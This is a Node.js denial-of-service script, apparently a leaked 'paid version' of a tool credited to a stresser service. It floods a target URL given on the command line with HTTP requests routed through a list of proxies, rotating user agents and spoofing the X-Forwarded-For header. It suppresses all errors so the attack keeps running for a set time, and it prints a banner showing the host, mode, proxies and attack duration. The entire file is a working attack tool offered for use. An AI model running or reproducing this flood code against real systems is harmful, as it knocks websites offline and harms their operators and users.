const request = require('request'), fs = require('fs'), proxies = fs.readFileSync(process.argv[3], 'utf-8').match(/\S+/g);
process.on('uncaughtException', _0x1e445a => {
});
process.on('unhandledRejection', _0xe8ce89 => {
});
const UAs = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36',
    'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)'
];
setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);
function Send() {
    var _0x2cb940 = proxies[Math.floor(Math.random() * proxies.length)];
    request({
        method: process.argv[5],
        url: process.argv[2],
        headers: {
            Referer: process.argv[2],
            Accept: '*/*',
            'User-Agent': UAs[Math.floor(Math.random() * UAs.length)],
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': _0x2cb940.split(':')[0]
        },
        proxy: 'http://' + _0x2cb940
    }, function (_0x2592ab, _0x5d5caa, _0x2caf45) {
    });
}
setInterval(() => {
    Send();
});
console.log('');
console.log('');
console.log('\x1B[95m.d8888. \x1B[97md88888b \x1B[95md8b   db \x1B[97md8888b.  \x1B[95m.d8b.  \x1B[97md888888b     ');
console.log('\x1B[95m88\'  YP \x1B[97m88\'     \x1B[95m888o  88 \x1B[97m88  `8D \x1B[95md8\' `8b   \x1B[97m`88\'   ');
console.log('\x1B[95m`8bo.   \x1B[97m88ooooo \x1B[95m88V8o 88 \x1B[97m88oodD\' \x1B[95m88ooo88    \x1B[97m88    ');
console.log('\x1B[95m  `Y8b. \x1B[97m88~~~~~ \x1B[95m88 V8o88 \x1B[97m88      \x1B[95m88~~~88    \x1B[97m88    ');
console.log('\x1B[95mdb   8D \x1B[97m88.     \x1B[95m88  V888 \x1B[97m88      \x1B[95m88   88   \x1B[97m.88.   ');
console.log('\x1B[95m`8888Y\' \x1B[97mY88888P \x1B[95mVP   V8P \x1B[97m88      \x1B[95mYP   YP \x1B[97mY888888P ');
console.log('');
console.log('\x1B[97m            [\x1B[95mSENPAI PAID VERSION FOR GENERATION LEAK \x1B[97m]\r\n');
console.log('');
console.log('[SENPAI] Host > ', process.argv[2]);
console.log('');
console.log('[SENPAI] Mode > ', process.argv[5]);
console.log('');
console.log('[SENPAI] Proxies: %s', process.argv[3]);
console.log('');
console.log('[SENPAI] Time Attack: %s', process.argv[4]);
console.log('');
console.log('[SENPAI] This script made by DarlingSh For StressHub.cc');
console.log('');
console.log('\x1B[32m Latest Updated By S EN P A I  S H\x1B[32m');
console.log('');
